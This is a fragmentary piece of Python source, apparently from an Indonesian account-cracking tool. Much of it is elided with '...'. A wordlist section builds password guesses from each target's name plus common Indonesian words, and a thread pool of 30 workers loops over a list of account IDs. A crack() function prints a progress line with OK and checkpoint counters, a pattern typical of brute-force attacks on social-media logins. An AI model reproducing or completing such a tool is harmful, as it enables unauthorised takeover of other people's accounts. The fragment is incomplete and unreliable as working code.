...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} XXXXXXXXXXXXXXXXXX {m}•{k}•{h}•{x} <<<<< ')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['sayang','rahasia','kucing','indonesia']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[{h}!{x}] XXXXXXXXXX {h}{P}{b}{loop}{P}/{u}{len(id)}{P} {H}OK:{P}{ok}{P} {k}CP:{P}{cp}{x}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
